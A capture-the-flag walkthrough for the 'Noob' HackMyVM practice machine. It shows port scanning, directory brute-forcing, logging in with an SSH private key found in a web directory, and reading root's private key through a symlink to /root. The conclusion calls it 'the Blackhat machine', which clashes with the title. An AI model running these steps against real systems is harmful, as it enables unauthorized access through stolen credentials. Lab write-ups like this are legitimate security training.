🧩 Noob Machine Walkthrough – HackMyVM
Difficulty: Easy
Goal: Gain access as user adela via SSH key exposure, then escalate to root by abusing symbolic links and accessing root’s private key.
Target IP: 192.168.1.134

🔍 Initial Enumeration
Full TCP port scan:

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.134
Service and version detection:

nmap -sCV -p22,65530 192.168.1.134
Discovered open ports:

22/tcp – OpenSSH

65530/tcp – HTTP

🌐 Web Analysis
Directory brute-forcing using Gobuster:

gobuster dir -u http://192.168.1.134 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,jpg -r -k
Found paths:

/index.html

/nt4share/

Within /nt4share/, an exposed id_rsa private key for the user adela is found.

🔑 User Access via SSH Key

Download the private key and set proper permissions:

chmod 600 id_rsa
Connect via SSH:

ssh -i id_rsa adela@192.168.1.134
Access as user adela is granted.

⚡ Privilege Escalation to Root

From within adela’s session, create a symbolic link to the root directory:
ln -s /root root
Navigate into the root symlink and access root’s id_rsa.

Use that private key to connect as root:

chmod 600 id_rsa_root
ssh -i id_rsa_root root@192.168.1.134
Access granted as root. Both user.txt and root.txt flags are obtained.

🎯 Conclusion

The Blackhat machine was fully compromised due to:

Exposure of SSH private key through a web-accessible directory.

Insecure permissions that allowed reading root’s home directory.

No key passphrases or SSH hardening mechanisms in place.

By chaining these misconfigurations, the attacker is able to pivot from web access to full root shell control.
